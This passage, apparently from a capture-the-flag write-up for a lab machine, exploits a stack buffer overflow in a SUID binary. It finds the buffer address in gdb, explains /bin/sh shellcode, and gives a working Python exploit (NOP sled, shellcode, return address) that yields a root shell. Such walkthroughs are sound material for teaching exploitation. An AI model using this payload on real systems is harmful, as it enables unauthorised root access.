0028| 0xffffce2c --> 0xf7fa4000 --> 0x1e4d6c 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()

```

It worked.

### Find Address of buffer

Now I want to find the address of the local variable I’m writing to on the stack. As `gdb` is on Sneaky, I’ll run it there. It’s a 32-bit machine, whereas my VM is 64-bit, which will change some addresses in memory.

I’ll open it in `gdb`, set a break on `main`, and run it with a long string of A as the input:

```

thrasivoulos@Sneaky:/dev/shm$ gdb -q chal
Reading symbols from chal...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x8048420
(gdb) r $(python -c 'print "A"*400')
Starting program: /usr/local/bin/chal $(python -c 'print "A"*400')

Breakpoint 1, 0x08048420 in main ()
(gdb) 

```

I’ll check out the stack, looking for the buffer:

```

Breakpoint 1, 0x08048420 in main ()
(gdb) x/64xw $esp
0xbffff558:     0x00000000      0xb7e3baf3      0x00000002      0xbffff5f4
...[snip not in there, hit enter again to get the next 64 words]...
(gdb) 
0xbffff658:     0x00000020      0xb7fdccf0      0x00000021      0xb7fdc000
...[snip]...
0xbffff6f8:     0x30000000      0x74a32cd4      0x03dea1e8      0x5830b128
0xbffff708:     0x692368fe      0x00363836      0x7273752f      0x636f6c2f
0xbffff718:     0x622f6c61      0x632f6e69      0x006c6168      0x41414141
0xbffff728:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff738:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff748:     0x41414141      0x41414141      0x41414141      0x41414141

```

If I run a few times, I’ll notice that the addresses are always the same.

That batch of As will go on for a while. I’ll select 0xbffff754 as a good offset. I’m going to use a nop sled, which is just a long string of single byte instructions that do nothing. That means that landing anywhere in the sled will result in the code just after the sled being run.

### Shellcode

Shellcode to start `/bin/sh` is really small and Googling for it will return many options. [This one](http://shell-storm.org/shellcode/files/shellcode-811.php) seemed fine, and it’s 28 bytes.

Taking a quick peak at the instructions:

```

08048060 <_start>:
 8048060: 31 c0                 xor    %eax,%eax
 8048062: 50                    push   %eax
 8048063: 68 2f 2f 73 68        push   $0x68732f2f
 8048068: 68 2f 62 69 6e        push   $0x6e69622f 
 804806d: 89 e3                 mov    %esp,%ebx   <-- EBX = top of stack
 804806f: 89 c1                 mov    %eax,%ecx   <-- ECX = 0
 8048071: 89 c2                 mov    %eax,%edx   <-- EDX = 0
 8048073: b0 0b                 mov    $0xb,%al    <-- EAX = 11
 8048075: cd 80                 int    $0x80       <-- syscall: 11 == execve
 8048077: 31 c0                 xor    %eax,%eax   <-- EAX = 0
 8048079: 40                    inc    %eax        <-- EAX = 1
 804807a: cd 80                 int    $0x80       <-- syscall: 1 == exit

```

It sets `$EAX` to 0, then pushes that onto the stack. Then it pushed `/bin/sh` onto the stack.

It’s going to eventually call `int 0x80`, which is to make a syscall. [This table](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit) shows the various syscalls for 32-bit Linux. The syscall number is read from `$EAX`, and just before the syscall trigger it puts 0xb there, which is `execve`. It sets `$EBX` to the address of the top of the stack, which points to `/bin/sh`. It then nulls `$ECX` and `$EDX`. This all leads to `execve('/bin/sh', 0, 0)`. Then it sets `$EAX` to one and triggers another syscall to exit.

### Script

All of this comes together to make the following script:

```

#!/usr/bin/env python3

import sys

offset = 362
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
nop = b"\x90" * (offset - len(shellcode))
EIP = b"\x54\xf7\xff\xbf"

payload = nop + shellcode + EIP

sys.stdout.buffer.write(payload)

```

In Python3, I’ll need to use `sys.stdout.buffer.write` instead of print to output the raw bytes correctly.

### Execute

The script puts out the bytes I’m expecting:

```

thrasivoulos@Sneaky:/dev/shm$ python3 d3 | wc -c
366
thrasivoulos@Sneaky:/dev/shm$ python3 d3 | xxd 
0000000: 9090 9090 9090 9090 9090 9090 9090 9090  ................
...[snip]...
0000130: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000140: 9090 9090 9090 9090 9090 9090 9090 31c0  ..............1.
0000150: 5068 2f2f 7368 682f 6269 6e89 e389 c189  Ph//shh/bin.....
0000160: c2b0 0bcd 8031 c040 cd80 54f7 ffbf       .....1.@..T...

```

Now I’ll feed that in as an argument to `chal` and it returns a root shell:

```

thrasivoulos@Sneaky:/dev/shm$ chal $(python3 d3)
# id
uid=1000(thrasivoulos) gid=1000(thrasivoulos) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare),1000(thrasivoulos)

```

I can grab the root flag:

```

# cat /root/root.txt
c5153d86************************

```